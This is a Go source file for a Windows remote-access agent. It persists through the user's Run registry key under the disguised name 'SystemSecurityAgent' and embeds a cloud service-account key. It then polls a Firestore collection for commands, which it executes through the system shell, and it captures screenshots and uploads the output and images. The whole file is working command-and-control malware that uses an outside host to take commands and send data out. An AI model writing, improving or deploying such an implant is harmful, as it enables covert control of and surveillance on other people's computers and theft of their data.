package main

import (
	"bytes"
	"context"
	_ "embed"
	"encoding/base64"
	"fmt"
	"image/jpeg"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"syscall"
	"time"
	"unsafe"

	"cloud.google.com/go/firestore"
	firebase "firebase.google.com/go/v4"
	"github.com/kbinani/screenshot"
	"golang.org/x/sys/windows/registry"
	"google.golang.org/api/option"
)

const (
	collectionName = "commands"
	pollInterval   = 10 * time.Second
	cmdTimeout     = 60 * time.Second
	logFileName    = "agent.log"
)

//go:embed serviceAccountKey.json
var credBytes []byte

// Windows DLL for single-instance mutex
var (
	kernel32        = syscall.NewLazyDLL("kernel32.dll")
	procCreateMutex = kernel32.NewProc("CreateMutexW")
)

func main() {
	// 1. Recover from any panic and log it
	defer func() {
		if r := recover(); r != nil {
			log.Printf("💥 FATAL PANIC: %v", r)
		}
	}()

	// 2. Setup logging inside the EXE's directory
	setupLogging()

	// 3. Ensure only ONE instance runs at a time
	preventMultipleInstances()

	// 4. Automatically add to Windows Registry Startup
	setupStartup()

	ctx := context.Background()

	// 5. Connect to Firebase with RETRY (for startup network delays)
	var fsClient *firestore.Client
	var err error
	for i := 0; i < 10; i++ {
		creds := option.WithCredentialsJSON(credBytes)
		var app *firebase.App
		app, err = firebase.NewApp(ctx, nil, creds)
		if err == nil {
			fsClient, err = app.Firestore(ctx)
			if err == nil {
				break // Successfully connected
			}
		}
		log.Printf("⏳ Waiting for network/Firebase... (Attempt %d/10): %v", i+1, err)
		time.Sleep(15 * time.Second)
	}

	if fsClient == nil {
		log.Fatalf("❌ Failed to connect to Firebase after retries: %v", err)
	}
	defer fsClient.Close()

	log.Println("✅ Connected to Firebase")
	log.Printf("👀 Watching collection '%s' every %s", collectionName, pollInterval)

	// 6. Start polling loop
	runCycle(ctx, fsClient)

	ticker := time.NewTicker(pollInterval)
	defer ticker.Stop()

	for {
		<-ticker.C
		runCycle(ctx, fsClient)
	}
}

// setupStartup adds the executable to the Windows Registry so it runs on boot
func setupStartup() {
	if runtime.GOOS != "windows" {
		return
	}

	// Get the exact path of the current .exe, no matter where it is located
	exePath, err := os.Executable()
	if err != nil {
		log.Printf("⚠️ Failed to get exe path for startup: %v", err)
		return
	}

	// Open the Windows Registry Run key for the current user
	// (HKEY_CURRENT_USER does not require Administrator privileges)
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		log.Printf("⚠️ Failed to open registry key: %v", err)
		return
	}
	defer k.Close()

	// We wrap the path in quotes to handle folders with spaces (e.g., "C:\My Tools\")
	targetValue := `"` + exePath + `"`

	// Check if it's already set so we don't write over and over
	currentVal, _, err := k.GetStringValue("SystemSecurityAgent")
	if err == nil && currentVal == targetValue {
		return // Already set up correctly
	}

	// Set the registry value
	err = k.SetStringValue("SystemSecurityAgent", targetValue)
	if err != nil {
		log.Printf("⚠️ Failed to set registry value: %v", err)
	} else {
		log.Println("✅ Successfully registered in Windows Startup")
	}
}

func runCycle(ctx context.Context, client *firestore.Client) {
	iter := client.Collection(collectionName).Where("pending", "==", true).Documents(ctx)
	defer iter.Stop()

	for {
		doc, err := iter.Next()
		if err != nil {
			break
		}

		data := doc.Data()
		cmdStr, _ := data["cmd"].(string)
		if cmdStr == "" {
			continue
		}

		log.Printf("▶️  [%s] Running: %s", doc.Ref.ID, cmdStr)
		var result string

		if cmdStr == "screenshot" || cmdStr == "!screenshot" {
			log.Println("📸 Taking screenshot...")
			base64Img, err := takeScreenshot()
			if err != nil {
				result = fmt.Sprintf("[error] failed to take screenshot: %v", err)
			} else {
				result = "data:image/jpeg;base64," + base64Img
			}
		} else {
			var runErr error
			result, runErr = runShell(cmdStr)
			if runErr != nil {
				result = fmt.Sprintf("[error] %v\n%s", runErr, result)
			}
		}

		_, err = doc.Ref.Update(ctx, []firestore.Update{
			{Path: "pending", Value: false},
			{Path: "results", Value: result},
		})
		if err != nil {
			log.Printf("⚠️  Failed to save result for %s: %v", doc.Ref.ID, err)
		} else {
			log.Printf("✅ Saved result for %s", doc.Ref.ID)
		}
	}
}

func runShell(cmdStr string) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), cmdTimeout)
	defer cancel()

	var c *exec.Cmd
	if runtime.GOOS == "windows" {
		c = exec.CommandContext(ctx, "cmd", "/C", cmdStr)
	} else {
		c = exec.CommandContext(ctx, "sh", "-c", cmdStr)
	}
	out, err := c.CombinedOutput()
	return string(out), err
}

func takeScreenshot() (string, error) {
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		return "", fmt.Errorf("no active displays found")
	}

	img, err := screenshot.CaptureDisplay(0)
	if err != nil {
		return "", err
	}

	var buf bytes.Buffer
	err = jpeg.Encode(&buf, img, &jpeg.Options{Quality: 30})
	if err != nil {
		return "", err
	}

	return base64.StdEncoding.EncodeToString(buf.Bytes()), nil
}

// setupLogging creates the log file NEXT TO the .exe
func setupLogging() {
	exePath, err := os.Executable()
	if err != nil {
		os.Exit(1)
	}
	exeDir := filepath.Dir(exePath)
	logPath := filepath.Join(exeDir, logFileName)

	f, err := os.OpenFile(logPath, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
	if err != nil {
		// If we can't write to the exe directory (e.g., inside Program Files), fallback to Temp
		tempDir := os.TempDir()
		logPath = filepath.Join(tempDir, logFileName)
		f, err = os.OpenFile(logPath, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
		if err != nil {
			os.Exit(1)
		}
	}
	log.SetOutput(f)
	log.Println("--- Agent Started ---")
}

// preventMultipleInstances uses a Local Windows Mutex
func preventMultipleInstances() {
	if runtime.GOOS != "windows" {
		return
	}
	// Use Local\ instead of Global\ so it doesn't require Admin rights
	name, _ := syscall.UTF16PtrFromString("Local\\MyFirebaseAgentMutex")
	_, _, err := procCreateMutex.Call(0, 0, uintptr(unsafe.Pointer(name)))
	if err == syscall.ERROR_ALREADY_EXISTS {
		// Another instance is running. Exit silently.
		os.Exit(0)
	}
}